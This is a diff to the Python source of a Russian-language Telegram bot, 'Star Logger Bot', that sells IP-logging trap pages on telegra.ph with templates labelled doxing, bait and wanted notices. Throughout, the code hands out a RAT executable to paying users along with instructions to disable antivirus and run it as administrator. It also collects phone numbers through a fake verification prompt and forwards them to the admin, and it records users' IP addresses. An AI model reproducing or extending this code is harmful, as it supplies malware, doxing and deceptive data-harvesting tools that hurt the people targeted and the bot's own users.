@@ -26,10 +26,8 @@ RAT_FILE    = "rat.exe"
 CHANNEL_ID    = -1004336153105
 CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
 SUPPORT       = "@boyfrer"
-PREMIUM_PRICE = 5.0
 REF_REWARD    = 0.1
 REF_MARKUP    = 0.5
-# ЖЕСТКАЯ ССЫЛКА БЕЗ ОШИБОК
 BOT_LINK      = "https://t.me/StarsLogg_Robot?start=" 
 
 # ---------- BOT / TELEGRAPH ----------
@@ -47,25 +45,15 @@ def db_init():
     with _conn() as c:
         c.executescript("""
         CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT, 
-            user_id INTEGER UNIQUE, 
-            username TEXT, 
-            is_premium INTEGER DEFAULT 0, 
-            created_at TEXT,
-            banned INTEGER DEFAULT 0,
-            frozen INTEGER DEFAULT 0,
-            phone TEXT DEFAULT '—',
-            ip TEXT DEFAULT '—',
-            referrer_id INTEGER DEFAULT 0,
-            ref_balance REAL DEFAULT 0,
-            ref_rewarded INTEGER DEFAULT 0
+            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER UNIQUE, username TEXT, is_premium INTEGER DEFAULT 0, 
+            created_at TEXT, banned INTEGER DEFAULT 0, frozen INTEGER DEFAULT 0, phone TEXT DEFAULT '—', ip TEXT DEFAULT '—',
+            referrer_id INTEGER DEFAULT 0, ref_balance REAL DEFAULT 0, ref_rewarded INTEGER DEFAULT 0
         );
         CREATE TABLE IF NOT EXISTS balance (user_id INTEGER PRIMARY KEY, amount REAL DEFAULT 0);
         CREATE TABLE IF NOT EXISTS links (slug TEXT PRIMARY KEY, title TEXT, created_by INTEGER, created_at INTEGER, hits INTEGER DEFAULT 0);
         CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
         CREATE TABLE IF NOT EXISTS rtc_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, real_ip TEXT, ua TEXT, ts INTEGER);
         """)
-        # Миграция
         cols = [r["name"] for r in c.execute("PRAGMA table_info(users)").fetchall()]
         if "ref_balance" not in cols:
             c.execute("ALTER TABLE users ADD COLUMN ref_balance REAL DEFAULT 0")
@@ -86,8 +74,7 @@ def is_registered(user_id):
 
 def register(user_id, username, ref_id=0):
     with _conn() as c:
-        c.execute("INSERT OR IGNORE INTO users (user_id, username, created_at, referrer_id) VALUES (?,?,?,?)", 
-                  (user_id, username, datetime.now().isoformat(), int(ref_id)))
+        c.execute("INSERT OR IGNORE INTO users (user_id, username, created_at, referrer_id) VALUES (?,?,?,?)", (user_id, username, datetime.now().isoformat(), int(ref_id)))
 
 def get_user_info(user_id):
     with _conn() as c: return c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
@@ -192,7 +179,7 @@ def make_article(title, text, img_url, template_name, author_id, author_username
     html = build_html(text, trap_url, img_url)
     page = telegraph.create_page(title=title, html_content=html)
     url = f"https://telegra.ph/{page['path']}"
-    msg = f"<b>⭐️Star Logger Bot⭐️</b>\n<b>⭐️Статья создана</b>\n=============================\n⭐️Тема: {title}\n⭐️Ссылка: {url}"
+    msg = f"<b>⭐️Статья создана</b>\n=============================\nТема: {title}\nЛовушка: <code>{trap_url}</code>\n=============================\nСсылка: {url}"
     return msg, url, slug
 
 # ---------- WEBHOOK ----------
@@ -218,18 +205,14 @@ def webhook_rtc():
 @web_app.route('/check_rat_key', methods=['POST'])
 def check_rat_key():
     data = request.json
-    key = data.get("key", "")
-    status = get_setting(f"rat_key_{key}", "inactive")
-    return jsonify({"valid": status == "active"})
+    return jsonify({"valid": get_setting(f"rat_key_{data.get('key', '')}", "inactive") == "active"})
 
 @web_app.route('/save_ip', methods=['POST'])
 def save_ip():
     data = request.json
-    uid = data.get("user_id")
-    ip = data.get("ip")
+    uid = data.get("user_id"); ip = data.get("ip")
     if uid and ip:
-        with _conn() as c:
-            c.execute("UPDATE users SET ip=? WHERE user_id=?", (ip, uid))
+        with _conn() as c: c.execute("UPDATE users SET ip=? WHERE user_id=?", (ip, uid))
     return jsonify({"ok": True})
 
 def run_webhook():
@@ -238,13 +221,14 @@ def run_webhook():
 # ---------- MENUS ----------
 def show_main_menu(uid):
     kb = types.InlineKeyboardMarkup(row_width=2)
-    kb.add(types.InlineKeyboardButton("⭐️Наш канал", url=CHANNEL_LINK))
-    kb.add(types.InlineKeyboardButton("📙Мануалы", url='https://t.me/c/2133502681/33'))
-    kb.add(types.InlineKeyboardButton("📙Профиль", callback_data='cabinet'))
-    kb.add(types.InlineKeyboardButton("🌟Создать логгер", callback_data='logger'))
+    kb.add(types.InlineKeyboardButton("⭐️ Наш канал", url=CHANNEL_LINK))
+    kb.add(types.InlineKeyboardButton("📙 Мануалы", url='https://t.me/c/2133502681/33'))
+    kb.add(types.InlineKeyboardButton("📙 Профиль", callback_data='cabinet'))
+    kb.add(types.InlineKeyboardButton("🌟 Создать логгер", callback_data='logger'))
+    
     prem = " 💎" if is_premium(uid) else ""
     with open('had2.jpg', 'rb') as had:
-        bot.send_photo(uid, had, f'<b>⭐️Star Logger Bot!{prem}\n=============================\n⭐️Главное меню\n=============================\n💰Баланс: {get_balance(uid):.2f}$\n🆔 ID: {uid}</b>', reply_markup=kb)
+        bot.send_photo(uid, had, f'<b>⭐️Star Logger Bot!{prem}</b>\n=============================\n<b>Главное меню</b>\n💰 Баланс: {get_balance(uid):.2f}$\n🆔 ID: <code>{uid}</code>', reply_markup=kb)
 
 def admin_menu(chat_id):
     if chat_id not in ADMIN_IDS: return
@@ -252,7 +236,7 @@ def admin_menu(chat_id):
     kb.add(types.InlineKeyboardButton("💰 Выдать баланс", callback_data='admin_give_bal'))
     kb.add(types.InlineKeyboardButton("👥 Все юзеры", callback_data='admin_users'))
     kb.add(types.InlineKeyboardButton("🔗 Все ссылки", callback_data='admin_links'))
-    kb.add(types.InlineKeyboardButton("🔑 Создать ключ RAT", callback_data='admin_gen_key'))
+    kb.add(types.InlineKeyboardButton("🦠 Выдать RAT", callback_data='admin_get_rat')) 
     kb.add(types.InlineKeyboardButton("📢 Рассылка", callback_data='admin_broadcast'))
     kb.add(types.InlineKeyboardButton("📊 Статистика", callback_data='admin_stats'))
     kb.add(types.InlineKeyboardButton("📦 База данных", callback_data='admin_dump'))
@@ -265,34 +249,26 @@ def cmd_start(message):
     uid = message.from_user.id
     username = message.from_user.username or ""
     
-    # Безопасный парсинг реф-ссылки
     ref_id = 0
     if len(message.text.split()) > 1:
         param = message.text.split()[1]
         if param.startswith("ref_"):
-            try: 
-                ref_id = int(param.split("_")[1])
-            except: 
-                ref_id = 0
+            try: ref_id = int(param.split("_")[1])
+            except: pass
 
     if not is_registered(uid):
         register(uid, username, ref_id)
         send_log(f"⭐️ Новый: <code>{uid}</code> @{username or '-'}")
     
     user = get_user_info(uid)
-    if user and user["banned"]:
-        bot.send_message(uid, "🚫 <b>Вы забанены.</b>")
-        return
-    if user and user["frozen"]:
-        bot.send_message(uid, "🧊 <b>Аккаунт заморожен.</b>")
-        return
+    if user and user["banned"]: return bot.send_message(uid, "🚫 <b>Вы забанены.</b>")
+    if user and user["frozen"]: return bot.send_message(uid, "🧊 <b>Аккаунт заморожен.</b>")
         
     if not check_sub(uid) and uid not in ADMIN_IDS:
         kb = types.InlineKeyboardMarkup()
         kb.add(types.InlineKeyboardButton("📢 Подписаться на канал", url=CHANNEL_LINK))
         kb.add(types.InlineKeyboardButton("✅ Проверить", callback_data='check_sub'))
-        bot.send_message(uid, "<b>⚠️ Подпишись на канал!</b>", reply_markup=kb)
-        return
+        return bot.send_message(uid, "<b>⚠️ Подпишись на канал!</b>", reply_markup=kb)
     show_main_menu(uid)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'check_sub')
@@ -300,13 +276,11 @@ def cb_check_sub(call):
     uid = call.from_user.id
     if check_sub(uid) or uid in ADMIN_IDS:
         user = get_user_info(uid)
-        # Начисление бонуса (только если подписался и еще не получал)
         if user["referrer_id"] != 0 and user["ref_rewarded"] == 0:
             add_ref_balance(user["referrer_id"], REF_REWARD)
             set_ref_rewarded(uid)
             try: bot.send_message(user["referrer_id"], f"🎉 По твоей ссылке зашел новый юзер! Тебе начислено +{REF_REWARD}$")
             except: pass
-            
         bot.delete_message(call.message.chat.id, call.message.message_id)
         show_main_menu(uid)
     else:
@@ -328,7 +302,6 @@ def cb_cabinet(call):
     prem = "💎 Premium" if is_premium(uid) else "Обычный"
     user = get_user_info(uid)
     
-    # Теперь ссылка формируется корректно
     ref_link = f"{BOT_LINK}ref_{uid}"
     lines = [
         f"<b>⭐️Профиль</b>",
@@ -337,49 +310,39 @@ def cb_cabinet(call):
         f"📊 Статус: {prem}",
         f"💰 Баланс: <b>{get_balance(uid):.2f}$</b>",
         f"👥 Реф. баланс: <b>{get_ref_balance(uid):.2f}$</b>",
-        f"🔗 Линков: {len(links)}",
-        f"🎯 Хитов: {total_hits}",
         "=============================",
         f"🔗 Твоя реф. ссылка:\n<code>{ref_link}</code>"
     ]
-    if user["phone"] == "—":
-        lines.append("⚠️ <i>Номер не привязан. Пройдите верификацию.</i>")
+    if user["phone"] == "—": lines.append("⚠️ <i>Номер не привязан.</i>")
 
-    kb = types.InlineKeyboardMarkup()
-    if user["phone"] == "—":
-        kb.add(types.InlineKeyboardButton("📱 Поделиться номером", callback_data="share_phone"))
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    if user["phone"] == "—": kb.add(types.InlineKeyboardButton("📱 Поделиться номером", callback_data="share_phone"))
     
     if is_premium(uid):
-        kb.add(types.InlineKeyboardButton("🕵️ Анонимность", callback_data="toggle_anon"))
+        kb.add(types.InlineKeyboardButton("🕵️ Анонимность (вкл/выкл)", callback_data="toggle_anon"))
         kb.add(types.InlineKeyboardButton("🦠 Скачать RAT", callback_data="get_rat_exe"))
     else:
         kb.add(types.InlineKeyboardButton("💎 Купить Premium", callback_data="buy_premium_menu"))
         
     kb.add(types.InlineKeyboardButton("📞 Поддержка", url=f"https://t.me/{SUPPORT[1:]}"))
-    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="home"))
+    kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="home"))
     
-    try:
-        bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id, caption="\n".join(lines), reply_markup=kb)
-    except:
-        bot.send_message(uid, "\n".join(lines), reply_markup=kb)
+    try: bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id, caption="\n".join(lines), reply_markup=kb)
+    except: bot.send_message(uid, "\n".join(lines), reply_markup=kb)
     bot.answer_callback_query(call.id)
 
-# ---------- ОБМАНКА НА НОМЕР ----------
 @bot.callback_query_handler(func=lambda c: c.data == "share_phone")
 def cb_share_phone(call):
     kb = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(types.KeyboardButton("📱 Отправить номер", request_contact=True))
-    bot.send_message(call.message.chat.id, "<b>Для верификации и снятия лимитов, подтвердите ваш номер телефона:</b>", reply_markup=kb)
+    bot.send_message(call.message.chat.id, "<b>Для снятия лимитов, подтвердите номер:</b>", reply_markup=kb)
     bot.answer_callback_query(call.id)
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
-    uid = message.from_user.id
-    phone = message.contact.phone_number
-    set_user_phone(uid, phone)
-    kb = types.ReplyKeyboardRemove()
-    bot.send_message(uid, "✅ <b>Номер успешно подтвержден! Лимиты сняты.</b>", reply_markup=kb)
-    try: bot.send_message(ADMIN_IDS[0], f"📱 <b>Новый номер!</b>\nЮзер: <code>{uid}</code>\nНомер: <code>{phone}</code>")
+    set_user_phone(message.from_user.id, message.contact.phone_number)
+    bot.send_message(message.from_user.id, "✅ <b>Номер подтвержден!</b>", reply_markup=types.ReplyKeyboardRemove())
+    try: bot.send_message(ADMIN_IDS[0], f"📱 <b>Номер:</b> <code>{message.contact.phone_number}</code>")
     except: pass
 
 # ---------- ПОДПИСКА ----------
@@ -388,45 +351,37 @@ def cb_buy_premium_menu(call):
     uid = call.from_user.id
     ref_bal = get_ref_balance(uid)
     
-    base_day = 0.88
-    base_week = 1.40
-    base_month = 1.82
+    base_day = 0.88; base_week = 1.40; base_month = 1.82
     
     kb = types.InlineKeyboardMarkup(row_width=1)
-    kb.add(types.InlineKeyboardButton(f"📅 1 день — {base_day:.2f}$ (обычные)", callback_data="pay_day_bal"))
-    kb.add(types.InlineKeyboardButton(f"📅 1 неделя — {base_week:.2f}$ (обычные)", callback_data="pay_week_bal"))
-    kb.add(types.InlineKeyboardButton(f"📅 1 месяц — {base_month:.2f}$ (обычные)", callback_data="pay_month_bal"))
+    kb.add(types.InlineKeyboardButton(f"📅 1 день — {base_day:.2f}$", callback_data="pay_day_bal"))
+    kb.add(types.InlineKeyboardButton(f"📅 1 неделя — {base_week:.2f}$", callback_data="pay_week_bal"))
+    kb.add(types.InlineKeyboardButton(f"📅 1 месяц — {base_month:.2f}$", callback_data="pay_month_bal"))
     
     if ref_bal > 0:
-        kb.add(types.InlineKeyboardButton(f"👥 1 день — {base_day+REF_MARKUP:.2f}$ (с реф. {ref_bal:.2f}$)", callback_data="pay_day_ref"))
-        kb.add(types.InlineKeyboardButton(f"👥 1 неделя — {base_week+REF_MARKUP:.2f}$ (с реф. {ref_bal:.2f}$)", callback_data="pay_week_ref"))
-        kb.add(types.InlineKeyboardButton(f"👥 1 месяц — {base_month+REF_MARKUP:.2f}$ (с реф. {ref_bal:.2f}$)", callback_data="pay_month_ref"))
+        kb.add(types.InlineKeyboardButton(f"👥 1 день (Реф) — {base_day+REF_MARKUP:.2f}$", callback_data="pay_day_ref"))
+        kb.add(types.InlineKeyboardButton(f"👥 1 неделя (Реф) — {base_week+REF_MARKUP:.2f}$", callback_data="pay_week_ref"))
+        kb.add(types.InlineKeyboardButton(f"👥 1 месяц (Реф) — {base_month+REF_MARKUP:.2f}$", callback_data="pay_month_ref"))
     
     kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="cabinet"))
-    
-    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption="<b>💎 Выбери тариф Premium:</b>\n\nС реферального баланса подписка дороже на 0.5$.", reply_markup=kb)
+    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption="<b>💎 Выбери тариф Premium:</b>\nС реф. баланса дороже на 0.5$.", reply_markup=kb)
     bot.answer_callback_query(call.id)
 
 @bot.callback_query_handler(func=lambda c: c.data.startswith('pay_'))
 def cb_pay_tariff(call):
     uid = call.from_user.id
-    parts = call.data.split('_')
-    tariff = parts[1]
-    pay_type = parts[2]
+    tariff = call.data.split('_')[1]
+    pay_type = call.data.split('_')[2]
     
     prices = {'day': 0.88, 'week': 1.40, 'month': 1.82}
     price = prices[tariff]
     
     if pay_type == "ref":
         price += REF_MARKUP
-        if get_ref_balance(uid) < price:
-            bot.answer_callback_query(call.id, f"❌ Недостаточно реф. средств!\nНужно: {price:.2f}$", show_alert=True)
-            return
+        if get_ref_balance(uid) < price: return bot.answer_callback_query(call.id, "❌ Недостаточно реф. средств!", show_alert=True)
         sub_ref_balance(uid, price)
     else:
-        if get_balance(uid) < price:
-            bot.answer_callback_query(call.id, f"❌ Недостаточно средств!\nНужно: {price:.2f}$", show_alert=True)
-            return
+        if get_balance(uid) < price: return bot.answer_callback_query(call.id, "❌ Недостаточно средств!", show_alert=True)
         add_balance(uid, -price)
         
     set_premium(uid)
@@ -435,53 +390,22 @@ def cb_pay_tariff(call):
 
 @bot.callback_query_handler(func=lambda c: c.data == 'get_rat_exe')
 def cb_get_rat_exe(call):
-    if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
-        bot.answer_callback_query(call.id, "❌ Только Premium!", show_alert=True)
-        return
     try:
         with open(RAT_FILE, 'rb') as f:
-            bot.send_document(
-                call.from_user.id, 
-                f, 
-                caption="🦠 <b>Ваш RAT-клиент</b>\n\n"
-                        "<b>Как включить:</b>\n"
-                        "1. Скачайте файл на ПК.\n"
-                        "2. Отключите антивирус (Windows Defender).\n"
-                        "3. Запустите файл (от имени Администратора).\n"
-                        "4. Введите ключ (если запросит)."
-            )
-    except Exception as e:
+            bot.send_document(call.from_user.id, f, caption="🦠 <b>Ваш RAT</b>\n1. Отключите антивирус.\n2. Запустите от Админа.")
+    except:
         bot.send_message(call.from_user.id, f"❌ Файл {RAT_FILE} не найден.")
-        return
-
-    try:
-        keys = bot.send_message(call.from_user.id, "<b>Генерирую ключ доступа...</b>")
-        import random, string
-        key = "XELOK-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        set_setting(f"rat_key_{key}", "active")
-        
-        bot.edit_message_text(
-            chat_id=call.from_user.id, 
-            message_id=keys.message_id,
-            text=f"<b>🔑 Ваш ключ:</b> <code>{key}</code>\n\n"
-                 "Скопируйте этот ключ и вставьте его в программу при запросе.\n"
-                 "<i>Если окно не закрывается, подождите 10 минут.</i>"
-        )
-    except Exception as e:
-        bot.send_message(call.from_user.id, f"❌ Ошибка ключа: {e}")
-
     bot.answer_callback_query(call.id)
 
 # ---------- ADMIN ----------
 @bot.message_handler(commands=['admin'])
 def cmd_admin(m): admin_menu(m.chat.id)
 
-@bot.callback_query_handler(func=lambda c: c.data == 'admin_gen_key' and c.from_user.id in ADMIN_IDS)
-def cb_admin_gen_key(call):
-    import random, string
-    key = "XELOK-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-    set_setting(f"rat_key_{key}", "active")
-    bot.send_message(call.message.chat.id, f"✅ Ключ создан:\n<code>{key}</code>", parse_mode='HTML')
+@bot.callback_query_handler(func=lambda c: c.data == 'admin_get_rat' and c.from_user.id in ADMIN_IDS)
+def cb_admin_get_rat(call):
+    try:
+        with open(RAT_FILE, 'rb') as f: bot.send_document(call.from_user.id, f, caption="🦠 <b>RAT (Админ)</b>")
+    except: bot.send_message(call.from_user.id, f"❌ Файл не найден.")
     bot.answer_callback_query(call.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_give_bal' and c.from_user.id in ADMIN_IDS)
@@ -507,6 +431,7 @@ def cb_admin_users(call):
         phone = u['phone'] if u['phone'] != '—' else "нет"
         ip = u['ip'] if u['ip'] != '—' else "нет"
         lines.append(f"<code>{u['user_id']}</code> @{u['username'] or '-'} · {u['balance']:.2f}$ {status}\nТел: {phone} | IP: {ip}\nРеф: {u['ref_balance']:.2f}$")
+    
     text = "\n".join(lines)
     if len(text) > 4000: text = text[:3997] + "..."
     kb = types.InlineKeyboardMarkup()
@@ -586,18 +511,15 @@ def cb_toggle_anon(call):
 def cb_logger(call):
     user = get_user_info(call.from_user.id)
     if user and user["frozen"]:
-        bot.answer_callback_query(call.id, "🧊 Ваш аккаунт заморожен.", show_alert=True)
-        return
+        return bot.answer_callback_query(call.id, "🧊 Аккаунт заморожен.", show_alert=True)
         
-    if not check_sub(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
-        bot.answer_callback_query(call.id, "❌ Подпишись!", show_alert=True)
-        return
     kb = types.InlineKeyboardMarkup(row_width=1)
-    kb.add(types.InlineKeyboardButton("📙Д0xing", callback_data="cat_dox"))
-    kb.add(types.InlineKeyboardButton("📙Байты", callback_data="cat_bait"))
-    kb.add(types.InlineKeyboardButton("📙Розыски", callback_data="cat_wanted"))
-    kb.add(types.InlineKeyboardButton("📙Свой текст", callback_data="tpl_custom"))
-    kb.add(types.InlineKeyboardButton("⭐️Назад", callback_data="home"))
+    kb.add(types.InlineKeyboardButton("📙 Д0xing", callback_data="cat_dox"))
+    kb.add(types.InlineKeyboardButton("📙 Байты", callback_data="cat_bait"))
+    kb.add(types.InlineKeyboardButton("📙 Розыски", callback_data="cat_wanted"))
+    kb.add(types.InlineKeyboardButton("📙 Свой текст", callback_data="tpl_custom"))
+    kb.add(types.InlineKeyboardButton("⭐️ Назад", callback_data="home"))
+    
     with open('had2.jpg', 'rb') as had:
         bot.send_photo(call.message.chat.id, had, caption="<b>Выберите шаблон:</b>", reply_markup=kb)
     try: bot.delete_message(call.message.chat.id, call.message.message_id)
@@ -625,7 +547,7 @@ def cb_cat(call):
     elif call.data == "cat_bait": keys = ("tpl_man_v1", "tpl_man_v2", "tpl_money_v1", "tpl_money_v2")
     else: keys = ("tpl_mvd_v1", "tpl_mvd_v2", "tpl_sport_v1", "tpl_sport_v2")
     for k in keys: kb.add(types.InlineKeyboardButton(TEMPLATES[k], callback_data=k))
-    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="logger"))
+    kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="logger"))
     bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption="<b>Шаблоны:</b>", reply_markup=kb)
     bot.answer_callback_query(call.id)
 
